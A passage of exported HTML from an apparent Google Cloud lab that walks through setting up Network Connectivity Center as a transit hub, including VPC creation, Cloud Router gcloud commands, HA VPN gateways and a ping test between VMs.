45px;"></div><div class="CodeMirror-gutters" style="display: none; height: 45px;"></div></div></div></pre><p><span>      </span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> to edit.</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> - **Network**: `vpc-a`</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> - **Subnetwork**: `vpc-a-sub1-use4`</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 90px;"></div><div class="CodeMirror-gutters" style="display: none; height: 90px;"></div></div></div></pre><ol start='4' ><li><p><span>Once all sections are configured, scroll down and click </span><strong><span>Create</span></strong><span> to launch your virtual machine instance.</span></p></li></ol><p><strong><span>Note:</span></strong><span> The instance creation process is asynchronous. You can check on the status of the task using the top right-hand side </span><strong><span>Activities</span></strong><span> icon. Wait for it to finish - it shouldn&#39;t take more than a minute.</span></p><p><strong><span>Note:</span></strong><span> If you receive an error when creating a VM, click into </span><strong><span>Details</span></strong><span>. Most likely you need to try again with a different zone.</span></p><p><span>Once finished, you should see the new virtual machine in the </span><strong><span>VM Instances</span></strong><span> page.</span></p><p><span>Similarly, create another VM in </span><strong><span>vpc-b</span></strong><span> using the following parameters:</span></p><ol start='' ><li><p><span>In the </span><strong><span>Machine configuration</span></strong></p><p><span>Enter the values for the following fields:</span></p><figure class='table-figure'><table><thead><tr><th style='text-align:left;' ><span>Field</span></th><th style='text-align:left;' ><span>Value</span></th></tr></thead><tbody><tr><td style='text-align:left;' ><strong><span>Name</span></strong></td><td style='text-align:left;' ><code>vpc-b-vm-1</code></td></tr><tr><td style='text-align:left;' ><strong><span>Region</span></strong></td><td style='text-align:left;' ><code>&lt;Region 2&gt;</code></td></tr><tr><td style='text-align:left;' ><strong><span>Zone</span></strong></td><td style='text-align:left;' ><code>&lt;Zone 2&gt;</code></td></tr><tr><td style='text-align:left;' ><strong><span>Series</span></strong></td><td style='text-align:left;' ><code>E2</code></td></tr><tr><td style='text-align:left;' ><strong><span>Machine</span></strong></td><td style='text-align:left;' ><code>e2-medium</code></td></tr></tbody></table></figure></li><li><p><span>Click </span><strong><span>OS and storage</span></strong></p><p><span>Click </span><strong><span>Change</span></strong><span> to begin configuring your boot disk and select the values for:</span></p><figure class='table-figure'><table><thead><tr><th style='text-align:left;' ><span>Field</span></th><th style='text-align:left;' ><span>Value</span></th></tr></thead><tbody><tr><td style='text-align:left;' ><strong><span>Operating system</span></strong></td><td style='text-align:left;' ><code>Debian</code></td></tr><tr><td style='text-align:left;' ><strong><span>Version</span></strong></td><td style='text-align:left;' ><code>Debian GNU/Linux 11 (bullseye) x86/64</code></td></tr><tr><td style='text-align:left;' ><strong><span>Boot disk type</span></strong></td><td style='text-align:left;' ><code>balanced persistent disk</code></td></tr><tr><td style='text-align:left;' ><strong><span>Size (GB)</span></strong></td><td style='text-align:left;' ><code>10 GB</code></td></tr></tbody></table></figure></li><li><p><span>Click </span><strong><span>Networking</span></strong></p><ul><li><p><span>Network interfaces</span></p><p><span> </span></p><p><span>: click on</span></p><p><span> </span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">default</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span> </span></p><p><span>to edit.</span></p><ul><li><p><strong><span>Network</span></strong><span>: </span><code>vpc-b</code></p></li><li><p><strong><span>Subnetwork</span></strong><span>: </span><code>vpc-b-sub1-usw2</code></p></li></ul></li></ul></li><li><p><span>Once all sections are configured, scroll down and click </span><strong><span>Create</span></strong><span> to launch your virtual machine instance.</span></p></li></ol><p><span>Once finished, you should see the two virtual machines in the </span><strong><span>VM Instances</span></strong><span> page.</span></p><ol start='' ><li><p><span>Copy the internal IP of </span><strong><span>vpc-b-vm-1</span></strong><span>.</span></p></li></ol><p><img src="images/1uljy8fJ3Z9PN3q9BV9%2F9GVKxp9YygA8rVHPQIXdQuU%3D.png" referrerpolicy="no-referrer" alt="IP address of vpc-b-vm-1 highlighted on the VM Instances page"></p><p><span>Click </span><em><span>Check my progress</span></em><span> to verify the objective.</span></p><p><span>Create VMs in the remote branch office VPCs</span></p><p>&nbsp;</p><p><span>Check my progress</span></p><p>&nbsp;</p><h4 id='step-3-run-the-ping-command-and-verify-connectivity-to-bo2-via-ncc-transit'><span>Step 3: Run the ping command and verify connectivity to bo2 via NCC transit</span></h4><p><span>To verify the end to end connectivity, run a ping test between </span><em><span>vpc-a-vm-1</span></em><span> and </span><em><span>vpc-b-vm-1</span></em><span> using the following steps:</span></p><ol start='' ><li><p><span>SSH into </span><strong><span>vpc-a-vm-1</span></strong><span> by clicking on </span><strong><span>SSH</span></strong><span> on the right hand side of vpc-a-vm-1. This launches a SSH client directly from your browser.</span></p></li></ol><p><strong><span>Note:</span></strong><span> You can also SSH into the virtual machine. Learn more about SSH from the </span><a href='https://cloud.google.com/compute/docs/instances/connecting-to-instance'><span>Connect to an instance using ssh documentation</span></a><span>.</span></p><p>&nbsp;</p><p><img src="images/akxcwUSd1Af5FWejHAEaGAtsp7WZTFSKeWVZACNC0Zk%3D.png" referrerpolicy="no-referrer" alt="Command line terminal"></p><ol start='' ><li><p><span>Run a ping test from </span><strong><span>vpc-a-vm-1</span></strong><span> to the internal IP of </span><strong><span>vpc-b-vm-1</span></strong><span>.</span></p></li><li><p><span>You can click on the &quot;clipboard&quot; icon in the upper right corner of the text box to copy the contents.</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">ping -c 5 &lt;INTERNAL_IP_OF_VPC-B-VM-1&gt;</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p>&nbsp;</p><p><img src="images/JYccSGxzzFSU163WJCBgHq8wtgGuqfSlXSKKmGtsyaw%3D.png" referrerpolicy="no-referrer" alt="Command line terminal displaying ping statistics"></p><h4 id='congratulations-7'><span>Congratulations!</span></h4><p><span>This completes our lab for the Network Connectivity Center as a Transit hub with HA VPNs as spokes.</span></p><p>&nbsp;</p><h3 id='lab---configuring-network-connectivity-center-as-a-transit-hub'><span>LAB - Configuring Network Connectivity Center as a Transit Hub</span></h3><h4 id='overview-8'><span>Overview</span></h4><p><span>Network Connectivity Center (NCC) enables connecting different enterprise networks together that are outside of Google Cloud by leveraging Google&#39;s network—providing enterprises instant access to planet-scale reach and high reliability. Traffic between non-Google networks is referred to as data transfer traffic, which can occur using existing standard cloud network connectivity resources such as Cloud VPN, Dedicated or Partner Interconnect.</span></p><p><span>In this lab, you will go through the process of setting up NCC as a transit hub to route traffic between two non-Google networks using Google&#39;s backbone network.</span></p><h4 id='architecture-2'><span>Architecture</span></h4><p><span>NCC consists of hub and spoke resources.</span></p><p><strong><span>Hub</span></strong></p><p><span>A hub is a global Google Cloud resource that supports multiple attached spokes. It provides a simple way to connect spokes together to enable data transfer across them. A hub can provide data transfer between different on-premises locations and a Virtual Private Cloud (VPC) network through its attached spokes.</span></p><p><strong><span>Spoke</span></strong></p><p><span>A spoke is a Google Cloud network resource connected to a hub. It is part of the hub, and can&#39;t be created without creating the hub first. A spoke routes traffic to remote network address blocks and enables the connection of multiple remote networks.</span></p><p><span>Spokes can be of one of the following types:</span></p><ul><li><p><span>HA VPN tunnels</span></p></li><li><p><span>VLAN attachments</span></p></li><li><p><span>Router appliance instances that you or select partners deploy within Google Cloud</span></p></li></ul><p><span>The following network topology is similar to a typical customer deployment having branch offices located in two geographically separate locations. For this lab, you are simulating two VPCs </span><em><span>vpc-a</span></em><span>, and </span><em><span>vpc-b</span></em><span> in </span><code>us-central1</code><span>, and </span><code>us-west2</code><span> as the branch offices respectively.</span></p><p><span>The branch offices are connected to a VPC, </span><em><span>vpc-transit</span></em><span>, which is a central hub terminating a pair of HA VPNs. These VPNs are configured in a region closest to the branch offices. In the real world, these VPNs could be replaced using Interconnects.</span></p><p><span>You will configure the NCC hub in the </span><em><span>vpc-transit</span></em><span> network, and the two remote branch offices will be connected using the HA VPN tunnels as spokes.</span></p><p><img src="images/9k3iu618o9ppsU1nO%2FJRRX17rCFJCu%2BMp33J%2FtJ1C9o%3D.png" referrerpolicy="no-referrer" alt="Network topology project example"></p><p><span>In this lab, you will achieve the following objectives:</span></p><ol start='' ><li><p><span>Create a hub VPC called </span><em><span>vpc-transit</span></em><span>.</span></p></li><li><p><span>Create two remote branch office VPCs namely </span><em><span>vpc-a</span></em><span> and </span><em><span>vpc-b</span></em><span>.</span></p></li><li><p><span>Create HA VPN from </span><em><span>vpa-a</span></em><span> to </span><em><span>vpc-transit</span></em><span>, and </span><em><span>vpc-b</span></em><span> to </span><em><span>vpc-transit</span></em><span>.</span></p></li><li><p><span>Create a NCC hub resource and attach the HA VPNs as spokes.</span></p></li><li><p><span>Test the setup end to end deploying VMs in the remote branch office VPCs.</span></p></li></ol><h4 id='prerequisites'><span>Prerequisites</span></h4><ul><li><p><span>Basic knowledge of Google VPC Networking, and Compute Engine.</span></p></li><li><p><span>It is helpful to have completed the </span><a href='https://google.qwiklabs.com/catalog_lab/311'><span>Networking 101</span></a><span> and </span><a href='https://www.qwiklabs.com/focuses/6270?parent=catalog'><span>VPC Networking: Cloud HA-VPN</span></a><span> labs.</span></p></li></ul><h4 id='task-1-create-vpc-transit'><span>Task 1. Create vpc-transit</span></h4><ol start='' ><li><p><span>In the Google Cloud Console, in the top-right toolbar, click the </span><strong><span>Activate Cloud Shell</span></strong><span> button and run the following command to delete the </span><strong><span>default</span></strong><span> network.</span></p></li></ol><p><img src="images/vdY5e%2Fan9ZGXw5a%2FZMb1agpXhRGozsOadHURcR8thAQ%3D.png" referrerpolicy="no-referrer" alt="Cloud Shell icon"></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud compute networks delete default</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p>&nbsp;</p><ol start='' ><li><p><span>In the Google Cloud Console, from the </span><strong><span>Navigation Menu (</span><img src="https://cdn.qwiklabs.com/tkgw1TDgj4Q%2BYKQUW4jUFd0O5OEKlUMBRYbhlCrF0WY%3D" referrerpolicy="no-referrer" alt="Navigation menu icon"><span>)</span></strong><span>, go to </span><strong><span>VPC network</span></strong><span>.</span></p></li><li><p><span>Click </span><strong><span>CREATE VPC NETWORK</span></strong><span>.</span></p></li><li><p><span>Enter a Name for the network: </span><strong><span>vpc-transit</span></strong><span>.</span></p></li><li><p><span>You do not need to create a subnet for the </span><em><span>vpc-transit</span></em><span> so click </span><strong><span>Delete</span></strong><span> next to New Subnet.</span></p></li><li><p><span>Choose the Dynamic routing mode for the VPC network as </span><strong><span>Global</span></strong><span>.</span></p></li></ol><p><strong><span>Note:</span></strong><span> Learn more about dynamic routing from the </span><a href='https://cloud.google.com/vpc/docs/vpc#routing_for_hybrid_networks'><span>dynamic routing mode documentation</span></a><span>.</span></p><ol start='' ><li><p><span>Click </span><strong><span>Create</span></strong><span>.</span></p></li></ol><p><span>Click </span><em><span>Check my progress</span></em><span> to verify the objective.</span></p><p><span>Create vpc-transit network</span></p><p>&nbsp;</p><p><span>Check my progress</span></p><p>&nbsp;</p><h4 id='task-2-create-remote-branch-office-vpcs'><span>Task 2. Create remote branch office VPCs</span></h4><ol start='' ><li><p><span>In the Google Cloud Console, from the </span><strong><span>Navigation menu</span></strong><span>, go to the </span><strong><span>VPC network</span></strong><span>.</span></p></li><li><p><span>Click </span><strong><span>CREATE VPC NETWORK</span></strong><span>.</span></p></li><li><p><span>Enter a Name for the network as </span><strong><span>vpc-a</span></strong><span>.</span></p></li><li><p><span>Choose </span><strong><span>Custom</span></strong><span> for the Subnet creation mode.</span></p></li><li><p><span>In the New subnet section, specify the following configuration parameters for a subnet:</span></p><ul><li><p><span>Name for the subnet: </span><strong><span>vpc-a-sub1-use4</span></strong><span>.</span></p></li><li><p><span>Region: </span><strong><code>us-central1</code></strong><span>.</span></p></li><li><p><span>IP address range </span><strong><span>10.20.10.0/24</span></strong><span>. This is the primary IP range for the subnet.</span></p></li></ul></li><li><p><span>Click </span><strong><span>Done</span></strong><span>.</span></p></li><li><p><span>Choose the Dynamic routing mode for the VPC network as </span><strong><span>Regional</span></strong><span>.</span></p></li><li><p><span>Click </span><strong><span>Create</span></strong><span>.</span></p></li><li><p><span>To add the second remote branch office VPC, click </span><strong><span>CREATE VPC NETWORK</span></strong><span>.</span></p></li><li><p><span>Enter a Name for the network as </span><strong><span>vpc-b</span></strong><span>.</span></p></li><li><p><span>Choose </span><strong><span>Custom</span></strong><span> for the Subnet creation mode.</span></p></li><li><p><span>In the New subnet section, specify the following configuration parameters for a subnet:</span></p></li><li><p><span>Provide a Name for the subnet as </span><strong><span>vpc-b-sub1-usw2</span></strong><span>.</span></p></li><li><p><span>Select Region as </span><strong><code>us-west2</code></strong><span>.</span></p></li><li><p><span>Enter an IP address range </span><strong><span>10.20.20.0/24</span></strong><span>.</span></p></li><li><p><span>Click </span><strong><span>Done</span></strong><span>.</span></p></li><li><p><span>Choose the Dynamic routing mode for the VPC network as </span><strong><span>Regional</span></strong><span>.</span></p></li><li><p><span>Click </span><strong><span>Create</span></strong><span>.</span></p></li></ol><p><span>Now you should be able to view all 3 VPCs in the VPC networks console like this:</span></p><p><img src="images/Pb5gdQp%2B93LD4uC3K0KTB6v1mhwNz5Rst6YH1k5UTzc%3D.png" referrerpolicy="no-referrer" alt="VPC networks console displaying VPCs"></p><p><span>Click </span><em><span>Check my progress</span></em><span> to verify the objective.</span></p><p><span>Create remote branch office VPCs namely vpc-a and vpc-b</span></p><p>&nbsp;</p><p><span>Check my progress</span></p><p>&nbsp;</p><h4 id='task-3-configure-ha-vpn-between-the-remote-branch-office-vpcs-and-the-transit-hub-vpc'><span>Task 3. Configure HA VPN between the remote branch office VPCs and the transit hub VPC</span></h4><p><strong><span>Note:</span></strong><span> In this lab you are simulating the remote branch offices as Google Cloud VPCs, therefore using the steps listed to </span><a href='https://cloud.google.com/network-connectivity/docs/vpn/how-to/creating-ha-vpn2'><span>Create HA VPN between Google Cloud Networks</span></a><span>.</span></p><p>&nbsp;</p><p><span>For any practical implementation, you may replace the steps listed below with the steps for </span><a href='https://cloud.google.com/network-connectivity/docs/vpn/how-to/creating-ha-vpn'><span>Creating an HA VPN gateway to a peer VPN gateway</span></a><span> if you are using HA VPNs to connect to your branch offices.</span></p><p><span>In this section you will configure an HA VPN between the remote branch office VPCs (</span><em><span>vpc-a</span></em><span> and </span><em><span>vpc-b</span></em><span>) and the transit hub VPC (</span><em><span>vpc-transit</span></em><span>). HA VPN uses BGP for dynamically exchanging routes between Google Cloud and the peer network. Before configuring the HA VPNs, you need to create Cloud Routers associated with each VPC network.</span></p><p><strong><span>Note:</span></strong><span> Learn more about Cloud Routers </span><a href='https://cloud.google.com/network-connectivity/docs/router/concepts/overview'><span>in the Cloud Router overview documentation</span></a><span>.</span></p><h5 id='step-1-create-cloud-routers'><strong><span>Step 1: Create cloud routers</span></strong></h5><p><span>To create a new Cloud Router for each VPC, specify the following:</span></p><ol start='' ><li><p><span>In the Cloud Console, from the </span><strong><span>Navigation menu</span></strong><span>, go to </span><strong><span>Network Connectivity</span></strong><span> and select </span><strong><span>Cloud Routers</span></strong><span>.</span></p></li><li><p><span>Click </span><strong><span>Create router</span></strong><span>.</span></p></li><li><p><span>Enter name as </span><strong><span>cr-vpc-transit-use4-1</span></strong><span>.</span></p></li><li><p><span>Select the network as </span><strong><span>vpc-transit</span></strong><span>.</span></p></li><li><p><span>Select the region as </span><strong><code>us-central1</code></strong><span>.</span></p></li><li><p><span>Enter the </span><strong><span>ASN</span></strong><span> as </span><strong><span>65000</span></strong><span>.</span></p></li><li><p><span>Select </span><strong><span>Advertise all subnets visible to the Cloud Router (Default)</span></strong><span>.</span></p></li><li><p><span>Click </span><strong><span>Create</span></strong><span>.</span></p></li><li><p><span>Use the steps mentioned above to create additional cloud routers using the following details:</span></p></li></ol><figure class='table-figure'><table><thead><tr><th><strong><span>Cloud Router name</span></strong></th><th><strong><span>VPC Network</span></strong></th><th><strong><span>Region</span></strong></th><th><strong><span>Google ASN</span></strong></th></tr></thead><tbody><tr><td><em><span>cr-vpc-transit-usw2-1</span></em></td><td><span>vpc-transit</span></td><td><code>us-west2</code></td><td><span>65000</span></td></tr><tr><td><em><span>cr-vpc-a-use4-1</span></em></td><td><span>vpc-a</span></td><td><code>us-central1</code></td><td><span>65001</span></td></tr><tr><td><em><span>cr-vpc-b-usw2-1</span></em></td><td><span>vpc-b</span></td><td><code>us-west2</code></td><td><span>65002</span></td></tr></tbody></table></figure><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang="" style="break-inside: unset;"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud compute routers create cr-vpc-transit-use4-1 \</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  --region us-east4 \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  --network vpc-transit \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  --asn 65000</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud compute routers create cr-vpc-transit-usw2-1 \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  --region us-west2 \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  --network vpc-transit \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  --asn 65000</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud compute routers create cr-vpc-a-use4-1 \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  --region us-east4 \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  --network vpc-a \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  --asn 65001</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud compute routers create cr-vpc-b-usw2-1 \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  --region us-west2 \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  --network vpc-b \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  --asn 65002</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 473px;"></div><div class="CodeMirror-gutters" style="display: none; height: 473px;"></div></div></div></pre><p>&nbsp;</p><p>&nbsp;</p><h5 id='step-2-create-ha-vpn-gateways'><strong><span>Step 2: Create HA VPN gateways</span></strong></h5><p><span>Create an HA VPN gateway in the </span><em><span>vpc-transit</span></em><span> network for </span><code>us-central1</code><span> region, using the following steps:</span></p><ol start='' ><li><p><span>From the </span><strong><span>Navigation menu</span></strong><span>, go to </span><strong><span>Network Connectivity</span></strong><span> and select </span><strong><span>VPN</span></strong><span>.</span></p></li><li><p><span>Click </span><strong><span>Create VPN connection</span></strong><span>.</span></p></li><li><p><span>Select </span><strong><span>High-availability (HA) VPN</span></strong><span>.</span></p></li><li><p><span>Click </span><strong><span>Continue</span></strong><span>.</span></p></li><li><p><span>Specify a VPN gateway name as </span><strong><span>vpc-transit-gw1-use4</span></strong><span>.</span></p></li><li><p><span>Under the VPC network, select </span><strong><span>vpc-transit</span></strong><span>.</span></p></li><li><p><span>Select a Region as </span><strong><code>us-central1</code></strong><span>.</span></p></li><li><p><span>Click </span><strong><span>Create and continue</span></strong><span>.</span></p></li></ol><p><strong><span>Note:</span></strong><span> Before adding VPN tunnels, you need to create additional VPN gateways.</span></p><ol start='' ><li><p><span>From the VPN page, select </span><strong><span>Cloud VPN Gateways</span></strong><span>.</span></p></li><li><p><span>Click </span><strong><span>Create VPN gateway</span></strong><span> and enter the following details to create the additional VPN gateways:</span></p></li></ol><figure class='table-figure'><table><thead><tr><th><strong><span>VPN gateway name</span></strong></th><th><strong><span>VPC Network</span></strong></th><th><strong><span>Region</span></strong></th></tr></thead><tbody><tr><td><em><span>vpc-transit-gw1-usw2</span></em></td><td><span>vpc-transit</span></td><td><code>us-west2</code></td></tr><tr><td><em><span>vpc-a-gw1-use4</span></em></td><td><span>vpc-a</span></td><td><code>us-central1</code></td></tr><tr><td><em><span>vpc-b-gw1-usw2</span></em></td><td><span>vpc-b</span></td><td><code>us-west2</code></td></tr></tbody></table></figure><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang="" style="break-inside: unset;"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " 